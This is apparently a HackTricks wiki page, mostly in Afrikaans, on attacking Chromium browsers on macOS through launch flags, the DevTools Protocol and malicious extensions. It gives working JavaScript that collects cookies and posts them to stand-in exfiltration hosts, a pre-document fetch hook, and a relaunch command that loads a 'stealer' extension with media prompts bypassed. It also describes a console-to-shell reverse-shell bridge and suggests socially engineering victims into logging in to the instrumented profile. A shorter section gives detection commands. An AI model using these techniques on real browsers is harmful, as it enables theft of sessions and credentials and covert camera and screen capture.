# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basiese Inligting

Chromium-gebaseerde browsers soos Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi en Opera gebruik almal dieselfde command-line switches, preference files en DevTools automation interfaces. Op macOS kan enige user met GUI access 'n bestaande browser session terminate en dit heropen met arbitrary flags, extensions of DevTools endpoints wat met die target se entitlements loop.

#### Launching Chromium with custom flags on macOS

macOS hou een enkele UI instance per Chromium profile, dus vereis instrumentation normaalweg dat die browser force-closed word (byvoorbeeld met `osascript -e 'tell application "Google Chrome" to quit'`). Attackers relaunch dit tipies via `open -na "Google Chrome" --args <flags>` sodat hulle arguments kan inject sonder om die app bundle te wysig. Deur daardie command binne 'n user LaunchAgent (`~/Library/LaunchAgents/*.plist`) of login hook te wrap, word gewaarborg dat die tampered browser ná reboot/logoff respawn.

#### `--load-extension` Flag

Die `--load-extension` flag laai unpacked extensions outomaties (comma-separated paths). Kombineer dit met `--disable-extensions-except` om legitimate extensions te blokkeer terwyl slegs jou payload geforseer word om te run. Malicious extensions kan high-impact permissions soos `debugger`, `webRequest` en `cookies` aanvra om in DevTools protocols te pivot, CSP headers te patch, HTTPS te downgrade, of session material te exfiltrate sodra die browser start.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Hierdie switches expose die Chrome DevTools Protocol (CDP) oor TCP of 'n pipe sodat external tooling die browser kan drive. Google het widespread infostealer abuse van hierdie interface waargeneem en, vanaf Chrome 136 (March 2025), word die switches vir die default profile geïgnoreer tensy die browser met 'n non-standard `--user-data-dir` geloods word. Dit enforce App-Bound Encryption op real profiles, maar attackers kan steeds 'n fresh profile spawn, die victim coerce om daarin te authenticate (phishing/triage assistance), en cookies, tokens, device trust states of WebAuthn registrations via CDP harvest.<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag

Hierdie flag redirect die volledige browser profile (History, Cookies, Login Data, Preference files, ens.) na 'n attacker-controlled path. Dit is mandatory wanneer moderne Chrome builds met `--remote-debugging-port` gekombineer word, en dit hou ook die tampered profile geïsoleer sodat jy voorafbevolkte `Preferences`- of `Secure Preferences`-files kan drop wat security prompts disable, extensions auto-install en default schemes verander.

#### `--use-fake-ui-for-media-stream` Flag

Hierdie switch bypass die camera/mic permission prompt sodat enige page wat `getUserMedia` call onmiddellik access ontvang. Kombineer dit met flags soos `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` of CDP `Browser.grantPermissions` commands om audio/video, desk-share of WebRTC permission checks stilweg te capture sonder user interaction.

## Delivery & Relaunch Patterns Seen in the Wild

CDP abuse is algemeen 'n **post-exploitation** stage eerder as die initial payload. 'n Onlangse macOS developer-targeting campaign het 'n poisoned Xcode **`Run Script` build phase** (`PBXShellScriptBuildPhase`) gebruik sodat code slegs executed is wanneer die victim die project **built** het, nie wanneer hulle dit bloot cloned of opened het nie. Ná daardie eerste execution het die malware ook ander `.xcodeproj` trees geïnfect, malicious Git `pre-commit` hooks bygevoeg en ZIP archives vir meer Xcode projects gesoek.<sup>[[3]](#references)</sup>

Vir Chromium abuse is dit belangrik omdat die attacker nie die browser binary self hoef te patch nie. 'n Kortstondige build-phase / `osascript` stager kan eerder 'n **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher, ens.) installeer wat die legitimate browser elke keer wanneer die user dit start, met attacker-controlled flags heropen.<sup>[[3]](#references)</sup>

> [!TIP]
> Op developer endpoints, inspect `.pbxproj` files, `.git/hooks/pre-commit` en ZIPs wat `.xcodeproj` bevat vir onverwagte `curl`, `osascript`, `xxd`, geneste `base64` of Chrome relaunch logic.

## Remote Debugging & DevTools Protocol Abuse

Sodra Chrome met 'n toegewyde `--user-data-dir` en `--remote-debugging-port` relaunched is, kan jy oor CDP attach (byvoorbeeld via `chrome-remote-interface`, `puppeteer` of `playwright`) en high-privilege workflows script:

- **Cookie/session theft:** `Network.getAllCookies` en `Storage.getCookies` return HttpOnly values selfs wanneer App-Bound encryption normaalweg filesystem access sou block, omdat CDP die running browser vra om dit te decrypt.
- **Permission tampering:** `Browser.grantPermissions` en `Emulation.setGeolocationOverride` laat jou toe om camera/mic prompts te bypass (veral wanneer dit met `--use-fake-ui-for-media-stream` gekombineer word) of location-based security checks te vervals.
- **Keystroke/script injection:** `Runtime.evaluate` execute arbitrary JavaScript binne die active tab, wat credential lifting, DOM patching of die injection van persistence beacons moontlik maak wat navigation oorleef.<sup>[[1]](#references)</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` en `Fetch.enable` intercept authenticated requests/responses in real time sonder om disk artifacts aan te raak.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Omdat Chrome 136 CDP op die verstekprofiel blokkeer, lewer die kopiëring van die slagoffer se bestaande `~/Library/Application Support/Google/Chrome`-gids na ’n staging-pad nie meer decrypted cookies op nie. Gebruik eerder social-engineering om die gebruiker binne die instrumented profiel te laat authenticateer (bv. ’n “behulpsame” support-sessie), of vang MFA-tokens onderweg vas via CDP-beheerde network hooks.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

’n Praktiese malware-patroon is:

1. Herbegin die userland-implant of wrapper elke keer wanneer Chrome geloods word.
2. Begin die legitieme browser met `--remote-debugging-port=<port>` en, op Chrome 136+, gewoonlik ’n gepaarde nie-verstek `--user-data-dir=<dir>`.
3. Begin ’n helper wat aan die plaaslike CDP WebSocket koppel en ’n pre-document hook met `Page.addScriptToEvaluateOnNewDocument` registreer.<sup>[[2]](#references)</sup>

Daardie helper kan JavaScript **voor** site code loop, wat ideaal is om `window.fetch`, `XMLHttpRequest`, wallet providers of autofill flows te hook sonder om lêers op skyf te patch.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
'n Sterker variant verander die browser in 'n **host command bridge**: geïnjekteerde JavaScript stuur 'n delimiter-gemerkte `console.log` uit, die plaaslike helper monitor `Runtime.consoleAPICalled`, verwyder die marker, voer die res deur die host shell uit (byvoorbeeld Go se `exec.Command`), en stuur stdout/stderr oor die aanvaller se WebSocket terug. Dit brei script-uitvoering op tab-vlak uit tot 'n meestal fileless reverse shell.<sup>[[3]](#references)</sup>

## Extension-Based Injection via Debugger API

Die 2023-navorsing "Chrowned by an Extension" het getoon dat 'n malicious extension wat die `chrome.debugger` API gebruik, aan enige tab kan koppel en dieselfde DevTools-vermoëns as `--remote-debugging-port` kan verkry.<sup>[[6]](#references)</sup> Dit verbreek die oorspronklike isolasie-aannames (extensions bly in hul konteks) en maak die volgende moontlik:

- Stil cookie- en credential-diefstal met `Network.getAllCookies`/`Fetch.getResponseBody`.
- Wysiging van site permissions (kamera, mikrofoon, geolocation) en omseiling van security interstitials, sodat phishing pages Chrome-dialoge kan naboots.
- On-path-manipulasie van TLS-waarskuwings, downloads of WebAuthn-prompts deur `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` of `Security.handleCertificateError` programmaties te beheer.

Laai die extension met `--load-extension`/`--disable-extensions-except` sodat geen user interaction vereis word nie. 'n Minimale background script wat die API weaponize, lyk soos volg:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Die uitbreiding kan ook op `Debugger.paused`-gebeurtenisse inteken om JavaScript-veranderlikes te lees, inline scripts te patch, of pasgemaakte breekpunte te laat val wat navigasie oorleef. Omdat alles binne die gebruiker se GUI-sessie loop, word Gatekeeper en TCC nie geaktiveer nie, wat hierdie tegniek ideaal maak vir malware wat reeds uitvoering binne die gebruikerskonteks verkry het.<sup>[[6]](#references)</sup>

## Opsporing & Hunting

- Genereer 'n waarskuwing wanneer Chromium-blaaiers met `--remote-debugging-port`, `--remote-debugging-pipe`, of 'n verdagte `--user-data-dir` geloods word, veral wanneer die ouerproses `bash`, `sh`, `osascript`, `xcodebuild`, of 'n LaunchAgent-helper is.
- Soek na kort kettings waar 'n helper 'n plaaslike CDP WebSocket oopmaak, `Page.addScriptToEvaluateOnNewDocument` registreer, en daarna 'n langdurige uitgaande WebSocket/HTTPS-verbinding maak.
- Hunt vir console-to-shell-brûe deur blaaier-`Runtime.consoleAPICalled`-aktiwiteit te korreleer met child shells of helper-prosesse wat aanvaller-verskafte opdragte uitvoer.
- Hersien op ontwikkelaar-Macs `.pbxproj`-`PBXShellScriptBuildPhase`-inskrywings, Git `pre-commit` hooks, Dock-/login-item-herlaaiers, en ZIP-bevattende Xcode-projekte vir blaaier-wrapper-installasie.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Gereedskap

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Outomatiseer Chromium-lanserings met payload extensions en stel interaktiewe CDP hooks beskikbaar.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Soortgelyke tooling wat op verkeersonderskepping en browser-instrumentasie vir macOS-operateurs fokus.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js-biblioteek om Chrome DevTools Protocol dumps (cookies, DOM, permissions) te script sodra ’n `--remote-debugging-port`-instansie aktief is.

### Voorbeeld
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Vind meer voorbeelde in die tools-skakels.

## Verwysings

- [1] [Chrome DevTools Protocol - Runtime-domein](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page-domein](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [Die Xcode Assassin keer terug: 'n Diepgaande Ontleding van die Jongste XCSSET-weergawe - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) op X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Veranderinge aan afstandfoutsporingskakelaars om sekuriteit te verbeter - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned deur 'n Uitbreiding: Misbruik van die Chrome DevTools Protocol deur die Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
